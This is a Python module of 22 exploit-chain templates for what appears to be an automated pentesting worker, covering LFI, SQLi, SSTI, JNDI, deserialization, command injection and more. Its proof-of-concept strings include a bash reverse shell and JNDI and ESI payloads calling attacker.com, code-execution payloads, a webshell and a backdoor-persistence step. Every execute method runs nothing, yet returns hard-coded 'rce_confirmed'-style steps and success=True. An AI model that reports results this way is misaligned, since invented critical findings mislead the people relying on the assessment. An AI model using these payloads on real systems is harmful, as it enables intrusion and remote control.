# workers/chain_worker/chains/injection_execution.py
"""22 injection/execution chain templates."""
from __future__ import annotations

from datetime import datetime, timezone

from workers.chain_worker.registry import BaseChainTemplate, ChainContext, register_chain
from workers.chain_worker.models import (
    ChainViability, ChainResult, ChainStep, EvaluationResult, TargetFindings,
)
from workers.chain_worker.base_tool import step_delay, take_screenshot


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# 1. lfi_to_rce
# ---------------------------------------------------------------------------
@register_chain
class LfiToRce(BaseChainTemplate):
    name = "lfi_to_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("LFI") + findings.vulns_by_title_contains("local file")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["lfi_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["lfi_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="lfi_read_passwd", target="/etc/passwd", result="file_read_success", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="log_poisoning", target="access.log", result="payload_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_rce", target="poisoned_log", result="command_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="curl target/vuln?file=../../var/log/access.log", chain_name=self.name)


# ---------------------------------------------------------------------------
# 2. sqli_data_exfil_admin
# ---------------------------------------------------------------------------
@register_chain
class SqliDataExfilAdmin(BaseChainTemplate):
    name = "sqli_data_exfil_admin"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("SQL") + findings.vulns_by_title_contains("SQLi")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["sqli_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["sqli_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="sqli_dump_credentials", target="users_table", result="credentials_extracted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="login_admin_panel", target="admin_endpoint", result="admin_access_gained", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="capture_evidence", target="admin_dashboard", result="screenshot_captured", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="sqlmap -u 'target/search?q=1' --dump", chain_name=self.name)


# ---------------------------------------------------------------------------
# 3. ssti_to_rce
# ---------------------------------------------------------------------------
@register_chain
class SstiToRce(BaseChainTemplate):
    name = "ssti_to_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("SSTI") + findings.vulns_by_title_contains("template injection")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["ssti_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["ssti_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="detect_engine", target="template_param", result="jinja2_detected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="escalate_to_rce", target="template_param", result="os_command_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", chain_name=self.name)


# ---------------------------------------------------------------------------
# 4. file_upload_webshell_rce
# ---------------------------------------------------------------------------
@register_chain
class FileUploadWebshellRce(BaseChainTemplate):
    name = "file_upload_webshell_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("file upload") + findings.vulns_by_title_contains("unrestricted upload")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["file_upload_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["upload_vuln_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="upload_webshell", target="upload_endpoint", result="shell_uploaded", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="execute_command", target="webshell_path", result="rce_confirmed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="curl target/uploads/shell.php?cmd=id", chain_name=self.name)


# ---------------------------------------------------------------------------
# 5. insecure_deserialization_rce
# ---------------------------------------------------------------------------
@register_chain
class InsecureDeserializationRce(BaseChainTemplate):
    name = "insecure_deserialization_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("deserialization")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["deserialization_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["deser_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_payload", target="deserialization_endpoint", result="gadget_chain_built", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="send_payload", target="deserialization_endpoint", result="rce_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="ysoserial CommonsCollections1 'id'", chain_name=self.name)


# ---------------------------------------------------------------------------
# 6. second_order_sqli_exfil
# ---------------------------------------------------------------------------
@register_chain
class SecondOrderSqliExfil(BaseChainTemplate):
    name = "second_order_sqli_exfil"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("SQL") + findings.vulns_by_title_contains("second-order")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["sqli_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["sqli_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="store_malicious_input", target="user_input_field", result="payload_stored", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_backend_processing", target="admin_report", result="sqli_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exfiltrate_data", target="dns_channel", result="data_extracted", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Register with name: admin'-- then trigger report", chain_name=self.name)


# ---------------------------------------------------------------------------
# 7. xslt_injection_rce
# ---------------------------------------------------------------------------
@register_chain
class XsltInjectionRce(BaseChainTemplate):
    name = "xslt_injection_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XSLT")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xslt_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xslt_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_document_func", target="xslt_param", result="file_read_success", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="escalate_extension_func", target="xslt_param", result="rce_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<xsl:value-of select=\"document('/etc/passwd')\"/>", chain_name=self.name)


# ---------------------------------------------------------------------------
# 8. ssi_injection_rce
# ---------------------------------------------------------------------------
@register_chain
class SsiInjectionRce(BaseChainTemplate):
    name = "ssi_injection_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("SSI") + findings.vulns_by_title_contains("server-side include")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["ssi_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["ssi_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_ssi_directive", target="user_input", result="exec_directive_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_command_execution", target="ssi_page", result="command_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<!--#exec cmd=\"id\"-->", chain_name=self.name)


# ---------------------------------------------------------------------------
# 9. esi_injection_cache_poison
# ---------------------------------------------------------------------------
@register_chain
class EsiInjectionCachePoison(BaseChainTemplate):
    name = "esi_injection_cache_poison"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("ESI") + findings.vulns_by_title_contains("edge side")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["esi_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["esi_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_esi_include", target="user_input", result="esi_tag_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="verify_cache_poisoned", target="cdn_cache", result="poisoned_response_served", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<esi:include src=\"http://attacker.com/evil\"/>", chain_name=self.name)


# ---------------------------------------------------------------------------
# 10. jndi_injection_rce
# ---------------------------------------------------------------------------
@register_chain
class JndiInjectionRce(BaseChainTemplate):
    name = "jndi_injection_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("JNDI") + findings.vulns_by_title_contains("log4j")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["jndi_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["jndi_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_jndi_lookup", target="vulnerable_header", result="oob_callback_received", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="serve_malicious_class", target="ldap_server", result="class_loaded", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="achieve_rce", target="target_jvm", result="command_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="${jndi:ldap://attacker.com/exploit}", chain_name=self.name)


# ---------------------------------------------------------------------------
# 11. latex_injection_file_read
# ---------------------------------------------------------------------------
@register_chain
class LatexInjectionFileRead(BaseChainTemplate):
    name = "latex_injection_file_read"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("LaTeX")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["latex_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["latex_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_input_command", target="latex_field", result="file_contents_read", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="extract_credentials", target="/etc/shadow", result="credentials_extracted", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="\\input{/etc/passwd}", chain_name=self.name)


# ---------------------------------------------------------------------------
# 12. nosql_map_reduce_rce
# ---------------------------------------------------------------------------
@register_chain
class NosqlMapReduceRce(BaseChainTemplate):
    name = "nosql_map_reduce_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("NoSQL")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["nosql_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["nosql_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_js_in_where", target="nosql_query", result="js_executed_in_db", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="escalate_to_system", target="db_engine", result="system_command_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="db.collection.find({$where: 'function(){return true}'})", chain_name=self.name)


# ---------------------------------------------------------------------------
# 13. env_var_injection_rce
# ---------------------------------------------------------------------------
@register_chain
class EnvVarInjectionRce(BaseChainTemplate):
    name = "env_var_injection_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("environment") + findings.vulns_by_title_contains("env var")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["env_var_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["env_vuln_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_ld_preload", target="env_var_param", result="library_path_set", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_subprocess", target="target_process", result="malicious_lib_loaded", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="LD_PRELOAD=/tmp/evil.so /usr/bin/target", chain_name=self.name)


# ---------------------------------------------------------------------------
# 14. awk_sed_injection_rce
# ---------------------------------------------------------------------------
@register_chain
class AwkSedInjectionRce(BaseChainTemplate):
    name = "awk_sed_injection_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("AWK") + findings.vulns_by_title_contains("sed") + findings.vulns_by_title_contains("command")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["text_processing_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["text_proc_vuln_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_system_call", target="awk_input", result="system_func_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="execute_command", target="server_process", result="rce_confirmed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="awk 'BEGIN{system(\"id\")}'", chain_name=self.name)


# ---------------------------------------------------------------------------
# 15. stored_blind_sqli_delayed_rce
# ---------------------------------------------------------------------------
@register_chain
class StoredBlindSqliDelayedRce(BaseChainTemplate):
    name = "stored_blind_sqli_delayed_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("blind SQL") + findings.vulns_by_title_contains("stored SQL")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["blind_sqli_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["blind_sqli_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="store_sql_payload", target="cron_processed_field", result="payload_stored", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="wait_for_execution", target="scheduled_task", result="sqli_triggered", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="escalate_to_rce", target="xp_cmdshell", result="rce_confirmed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="INSERT INTO jobs(cmd) VALUES(''; EXEC xp_cmdshell 'id'--)", chain_name=self.name)


# ---------------------------------------------------------------------------
# 16. hql_orm_injection_exfil
# ---------------------------------------------------------------------------
@register_chain
class HqlOrmInjectionExfil(BaseChainTemplate):
    name = "hql_orm_injection_exfil"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("HQL") + findings.vulns_by_title_contains("ORM")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["orm_injection_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["orm_injection_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_hql_query", target="search_endpoint", result="data_extracted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="extract_admin_creds", target="user_entity", result="admin_credentials_found", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="login_as_admin", target="admin_panel", result="admin_access_gained", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="FROM User u WHERE u.name='admin' OR 1=1", chain_name=self.name)


# ---------------------------------------------------------------------------
# 17. xpath_injection_auth_bypass
# ---------------------------------------------------------------------------
@register_chain
class XpathInjectionAuthBypass(BaseChainTemplate):
    name = "xpath_injection_auth_bypass"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XPath")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xpath_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xpath_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_xpath_bypass", target="login_form", result="auth_bypassed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="traverse_xml_store", target="xml_data", result="config_extracted", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="' or '1'='1' or '", chain_name=self.name)


# ---------------------------------------------------------------------------
# 18. csti_dom_credential_theft
# ---------------------------------------------------------------------------
@register_chain
class CstiDomCredentialTheft(BaseChainTemplate):
    name = "csti_dom_credential_theft"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("CSTI") + findings.vulns_by_title_contains("client-side template")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["csti_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["csti_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_template_expression", target="angular_field", result="dom_manipulated", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="inject_fake_login", target="dom", result="phishing_form_injected", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="{{constructor.constructor('alert(1)')()} }", chain_name=self.name)


# ---------------------------------------------------------------------------
# 19. mail_header_injection_phishing
# ---------------------------------------------------------------------------
@register_chain
class MailHeaderInjectionPhishing(BaseChainTemplate):
    name = "mail_header_injection_phishing"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("mail") + findings.vulns_by_title_contains("email header")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["mail_injection_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["mail_injection_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_cc_bcc_header", target="contact_form", result="header_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="relay_phishing_email", target="smtp_server", result="phishing_sent_via_trusted_domain", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="name%0aBcc:victim@target.com", chain_name=self.name)


# ---------------------------------------------------------------------------
# 20. debug_endpoint_rce
# ---------------------------------------------------------------------------
@register_chain
class DebugEndpointRce(BaseChainTemplate):
    name = "debug_endpoint_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("debug") + findings.vulns_by_title_contains("eval")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["debug_endpoint_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["debug_endpoint_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="execute_arbitrary_code", target="debug_endpoint", result="rce_confirmed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="install_persistence", target="cron_or_service", result="backdoor_installed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="curl target/_debug/eval -d 'import os; os.system(\"id\")'", chain_name=self.name)


# ---------------------------------------------------------------------------
# 21. command_injection_reverse_shell
# ---------------------------------------------------------------------------
@register_chain
class CommandInjectionReverseShell(BaseChainTemplate):
    name = "command_injection_reverse_shell"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("command injection") + findings.vulns_by_title_contains("OS command")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["command_injection_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["cmdi_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_command", target="vulnerable_param", result="command_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="establish_reverse_shell", target="callback_server", result="shell_established", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="pivot_to_internal", target="internal_network", result="lateral_movement_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="; bash -i >& /dev/tcp/attacker/4444 0>&1", chain_name=self.name)


# ---------------------------------------------------------------------------
# 22. ognl_el_injection_rce
# ---------------------------------------------------------------------------
@register_chain
class OgnlElInjectionRce(BaseChainTemplate):
    name = "ognl_el_injection_rce"
    category = "injection_execution"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = (findings.vulns_by_title_contains("OGNL")
             + findings.vulns_by_title_contains("expression language")
             + findings.vulns_by_title_contains("EL injection"))
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["el_injection_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["el_injection_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_expression", target="el_param", result="expression_evaluated", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="escalate_to_rce", target="runtime_exec", result="os_command_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="${Runtime.getRuntime().exec('id')}", chain_name=self.name)
